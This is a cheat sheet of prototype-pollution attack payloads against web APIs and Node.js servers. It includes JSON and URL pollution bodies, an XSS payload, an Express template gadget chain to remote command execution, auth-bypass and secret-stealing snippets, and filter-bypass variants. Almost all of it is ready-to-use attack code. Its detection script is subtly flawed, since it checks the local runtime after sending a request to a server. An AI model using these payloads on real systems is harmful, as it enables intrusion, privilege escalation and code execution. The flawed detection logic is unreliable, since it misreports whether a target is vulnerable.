#### 1. BASIC MANUAL TESTS
# Classic prototype pollution (client-side)
fetch('/api/user', {
  method: 'POST',
  body: JSON.stringify({
    "__proto__": {"isAdmin": true}
  })
})

# URL-based pollution
fetch('/api/data?__proto__[polluted]=true')

# Deep property pollution
fetch('/api/update', {
  method: 'POST',
  body: JSON.stringify({
    "constructor": {
      "prototype": {
        "polluted": true
      }
    }
  })
})

#### 2. AUTOMATED TOOLS
# PPScan (Node.js prototype pollution scanner)
npx ppscan http://target.com/api --param=user

# PPFuzzer (Prototype Pollution Fuzzer)
python3 ppfuzzer.py -u http://target.com/api -d '{"user":"test"}'

# Burp Suite Extension: "Prototype Pollution Scanner"

#### 3. EXPLOITATION TECHNIQUES
# Privilege escalation
Object.prototype.isAdmin = true

# XSS via pollution
Object.prototype.body = '<img src=x onerror=alert(1)>'

# Bypassing client-side security
Object.prototype.bypassAuth = true

#### 4. SERVER-SIDE PROTOTYPE POLLUTION
# Node.js pollution
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "toString": "maliciousCode"
  }
}

# Express.js RCE (when combined with other vulns)
Object.prototype.client = true
Object.prototype.escapeFunction = 'function(x){return x}'
Object.prototype.compileDebug = true

#### 5. BYPASS TECHNIQUES
# Alternative prototype access
constructor[prototype][polluted]=true
__proto__.constructor.prototype.polluted=true

# Array pollution
arr[__proto__][polluted]=true

# JSON spaces bypass
{ "  __proto__  ": { "polluted": true } }

#### 6. DETECTION METHODS
# Property existence check
if (({}).polluted === true) {
  console.log("Vulnerable to prototype pollution");
}

# toString tampering detection
Object.prototype.toString = function(){
  return "polluted";
}
console.log(({}).toString());

# DOM XSS sink detection
Object.prototype.innerHTML = "polluted";
document.write("");

#### 7. POST-EXPLOITATION
# Steal sensitive data
Object.prototype.getSecret = function(){
  return this.secretKey;
}

# Bypass security checks
Object.prototype.isValidUser = true

# Chain with other vulnerabilities
Object.prototype.template = '<%= process.mainModule.require("child_process").execSync("whoami") %>'

#### PRO TIPS:
# 1. Always test:
#  - All JSON input endpoints
#  - URL parameters
#  - Form submissions
#  - WebSocket messages
#  - API Gateway configurations

# 2. Critical contexts:
#  - Object merges (_.extend, Object.assign)
#  - Clone operations (_.cloneDeep)
#  - JSON.parse operations
#  - Template engines

# 3. Escalation paths:
#  - DOM XSS when pollution reaches client
#  - RCE in server-side JavaScript
#  - Authentication bypass
#  - Privilege escalation


# SECURITY IMPACT:
# - Successful prototype pollution may lead to:
# - Client-side XSS
# - Authentication bypass
# - Privilege escalation
# - Remote code execution (Node.js)
# - Data tampering
# - Security control bypass



#### RECOMMENDED PAYLOADS:
- {"__proto__":{"polluted":true}}
- {"constructor":{"prototype":{"polluted":true}}}
- {"a":1,"__proto__":{"polluted":true}}
- JSON.parse('{"__proto__":{"polluted":true}}')

#### SAMPLE DETECTION SCRIPT:
```javascript
// prototype_pollution_tester.js
async function testPrototypePollution(url) {
  const payloads = [
    '{"__proto__":{"polluted":true}}',
    '{"constructor":{"prototype":{"polluted":true}}}'
  ];

  for (const payload of payloads) {
    try {
      await fetch(url, {
        method: 'POST',
        body: payload,
        headers: {'Content-Type': 'application/json'}
      });
      
      if (({}).polluted === true) {
        console.log(`Vulnerable to prototype pollution via: ${payload}`);
        return;
      }
    } catch (e) {
      console.error(`Error testing payload: ${payload}`, e);
    }
  }
  console.log("No prototype pollution detected");
}

testPrototypePollution('http://target.com/api/update');
